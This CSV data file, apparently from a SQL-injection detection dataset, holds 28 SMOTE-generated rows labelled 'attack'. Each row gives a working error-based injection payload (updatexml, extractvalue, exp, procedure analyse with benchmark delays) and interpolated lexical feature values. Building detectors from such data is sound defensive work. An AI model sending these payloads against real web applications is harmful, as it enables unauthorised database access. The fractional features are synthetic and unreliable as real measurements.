id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000168,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000302,0.1227295637334215,144.64729918244905,26.07054016351019,3.661191521326815,34.21162049053057,38.71783934595924,52.858919672979624,18.85891967297962,0.23658506398638743,0.26762768655411706,0.36543036925676087,0.13035688020273464,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.92945983648981,0.0,0.0,5.92945983648981,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000024,0.07823165341853244,165.0,29.053067242153844,3.762867816254786,40.84079827353847,43.212268968615376,60.89386551569231,20.053067242153844,0.2475199895365968,0.26189253920372957,0.3690537303981352,0.12153374086153844,0.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.053067242153843,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000170,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000097,0.7369706327069274,153.223120182127,31.751581165757234,3.7911723089372833,52.981026010913176,23.248418834242763,58.745256502728296,18.248418834242763,0.34499138297564946,0.1519318606821885,0.38384823515578353,0.11922852118637851,0.2484188342427649,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,4.0,0.0,0.2484188342427647,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",nearest_attack_euclidean,R000158,0.4643845071276351,173.47682920209675,30.0,3.829888254917844,64.0,24.0,63.981463361677406,21.495365840419353,0.36916357239409253,0.13843633964778468,0.36854007476440437,0.12386001319371842,0.0,4.000000000000001,0.0,0.0,0.0,0.0,0.0,13.495365840419351,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000097,0.5460092724922347,148.1435114599551,32.21412213501122,3.8041084668519707,50.0,23.0,57.14351145995511,18.0,0.33755262332803726,0.15527420673089715,0.3856542255429722,0.12151894439809341,0.0,0.2141221350112238,0.0,0.0,0.0,0.0,0.0,12.785877864988777,0.0,0.0,4.0,0.0,0.0,0.21412213501122374,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000215,0.45129838617196666,187.79214101167025,29.792141011670246,3.858147735084293,66.0,37.0,66.0,18.792141011670246,0.3514540531695803,0.19702727223143138,0.3514540531695803,0.10006462142940811,0.7921410116702473,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,0.7921410116702472,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,4.0
SMOTE_000174,attack,error,"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000104,0.009420730244553482,188.00326831884354,27.00326831884353,3.4273067302032265,36.01307327537413,38.98692672462587,83.00653663768706,29.99673168115647,0.1915552211046935,0.20737405042763607,0.4415163125470324,0.15955441592063802,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,1.9999999999999998,0.0,5.996731681156467,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.003268318843533,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000175,attack,error,"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.7253235160092228,180.651159965545,37.98836997415875,4.047277690568805,63.651159965545,31.0,65.33721000861375,20.66278999138625,0.35227144449835673,0.1716203865004354,0.361743635751552,0.1143645332496559,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.6627899913862498,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.6627899913862498,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6627899913862496
SMOTE_000176,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000077,1.5575141999756852,193.68030058552492,33.77323313815836,3.9698938903259857,51.862456010963825,47.0,66.8178445745611,28.0,0.2675094396559748,0.2427935962041875,0.345053970656492,0.14464299348334572,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.40892228728054625,0.5910777127194538,0.40892228728054625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.4089222872805465
SMOTE_000177,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat",nearest_attack_euclidean,R000161,0.13043031638202726,161.93364842616663,30.0,3.8824687128317534,51.73459370466648,35.0,55.13270314766676,20.06635157383338,0.31947145395273774,0.21613842132827882,0.3404703338119336,0.12391979090704988,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.06635157383338,0.0,10.0,0.0,0.0,5.0,1.06635157383338,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000178,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",nearest_attack_euclidean,R000240,0.20669579940804955,161.0,29.0,3.915092902442651,48.42700725249132,38.43065699667824,53.28467150166088,20.85766424916956,0.30078886492230633,0.23869973289862262,0.33096069255689986,0.1295507096221712,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.857664249169559,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000179,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",nearest_attack_euclidean,R000240,0.6314272993960678,161.22994843889842,29.689845316695234,3.9425481436739047,48.22994843889841,39.0,53.0,21.0,0.2991328952379235,0.24189218659930076,0.32872527922469075,0.130249638938085,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.2299484388984117,0.7700515611015882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000180,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000293,0.04675343887045107,192.0,32.0,3.672206696699412,48.985785240183255,40.0,79.0,24.014214759816745,0.25513429812595445,0.20833333333333334,0.4114583333333333,0.1250740352073789,0.014214759816745026,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,0.014214759816745026,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.985785240183255,0.014214759816745082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000181,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",nearest_attack_euclidean,R000126,0.08214170738995116,161.96758467334325,31.87033869337298,4.004870863687651,48.87033869337298,39.0,53.06483065331351,21.032415326656754,0.30172468443112505,0.24078921086341587,0.3276290383463537,0.12985706635910535,0.0,4.000000000000001,0.0,0.0,0.0,1.0324153266567548,0.0,10.0,0.0,0.0,6.0,1.032415326656755,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000182,attack,error,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",nearest_attack_euclidean,R000299,0.7785690073046763,164.31143325312823,27.0,3.6645288636133806,36.31143325312823,39.0,63.0,26.0,0.22098534576498202,0.23735602746223203,0.3834212751312979,0.15823735164148803,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,1.9999999999999998,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.3114332531282278,0.6885667468717722,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000183,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000022,0.07563930634558101,194.0,27.207513678093477,3.5145141227743717,44.0,39.0,83.0,28.0,0.2268041237113402,0.20103092783505155,0.42783505154639173,0.14432989690721648,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000184,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",nearest_attack_euclidean,R000119,0.6635021812243824,192.25067008904117,31.50134017808232,3.6893104751401014,58.25067008904116,32.0,77.0,25.0,0.3029897936078237,0.16645019854141524,0.4005207902402804,0.13003921761048065,0.0,4.000000000000001,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.2506700890411604,0.7493299109588396,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000185,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz",nearest_attack_euclidean,R000250,0.9109587729632294,171.42353775002897,28.847075500057947,3.8028901460939446,46.694151000115895,39.0,62.15292449994205,23.576462249971026,0.2723596022803112,0.22750856887491056,0.36258898447022525,0.13754284437455291,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.5764622499710272,0.0,12.0,0.0,0.0,6.0,1.5764622499710272,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000186,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000222,0.40357898700894834,172.46774224071535,27.0,3.623833200601814,47.0,35.0,67.11520763489887,23.35253460581648,0.27276266351299167,0.20312113240329163,0.3887206538454703,0.13539555023824643,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.352534605816478,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000187,attack,error,"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000045,0.5724277369871882,140.76420896780579,29.292626903417347,3.5869385369858033,56.0,12.0,59.0,13.764208967805782,0.3978320312970049,0.08524972099221535,0.4191444615450587,0.09777378616572109,0.7642089678057816,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,1.0,2.0,0.7642089678057815,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,7.0
SMOTE_000188,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",nearest_attack_euclidean,R000057,0.03392344886487739,161.0,29.023215334645787,3.8918084581059653,45.069646003937365,38.90713866141685,55.046430669291574,21.976784665354213,0.27993568946544944,0.24165924634420405,0.3419032960825563,0.13650176810779016,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.976784665354213,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",nearest_attack_euclidean,R000221,0.38194064312814413,194.3062164057166,30.83062164057166,3.6194784941631672,51.491864921714985,35.67751343771335,81.30621640571661,25.83062164057166,0.2649901873918936,0.1838401102587156,0.41821929048293777,0.1329504118664531,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,15.661243281143324,0.0,0.0,5.169378359428339,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000190,attack,error,"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",nearest_attack_euclidean,R000200,0.30080945653613067,159.50220431275523,29.911894371338544,3.7843540287451587,47.942732456062515,35.35242251464583,57.295154970708346,18.911894371338544,0.300171321346664,0.22209984790853798,0.3591007634637785,0.11862806728101949,0.9118943713385432,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.911894371338544,0.0,0.0,5.088105628661457,1.0,0.911894371338543,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000191,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000099,0.10717388754553445,184.0,27.765477646308135,3.566223548775925,47.0,35.0,77.0,25.0,0.2554347826086957,0.19021739130434784,0.41847826086956524,0.1358695652173913,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000192,attack,error,"1%""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000284,0.030421743986695497,187.82217216554153,27.0,3.378485620080108,39.0,35.0,84.85773773243324,28.96443443310831,0.20765405467200215,0.18635620291077115,0.4517801237038733,0.15420961871335337,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,15.964434433108309,1.9999999999999998,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000193,attack,error,"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",nearest_attack_euclidean,R000279,1.0835906262746404,178.9767405610571,29.139534365865302,3.714864740445721,49.29069845120205,37.279068731730604,68.69767182932651,23.709301548797953,0.2761465360057417,0.20817243032998053,0.3833338779032159,0.1323471557610619,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,13.139534365865302,0.0,0.0,5.569767182932651,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000194,attack,error,"1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000290,0.5755841564304796,177.9453135808662,33.127232451676065,3.8578163208012324,48.0,43.0,66.3816973550282,20.563616225838032,0.26984901721338733,0.24173974458699285,0.37286024589383165,0.11555099230578818,0.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.56361622583803,0.0,0.0,5.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000195,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000244,1.3184238613747497,164.53959802456524,27.0,3.643437661863857,37.92080395086952,37.15839209826096,63.92080395086952,25.53959802456524,0.2304866047666133,0.22579787040853713,0.38850472935498376,0.1552107954698658,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,12.0,1.9999999999999998,0.0,5.539598024565241,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.539598024565241,0.4604019754347591,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
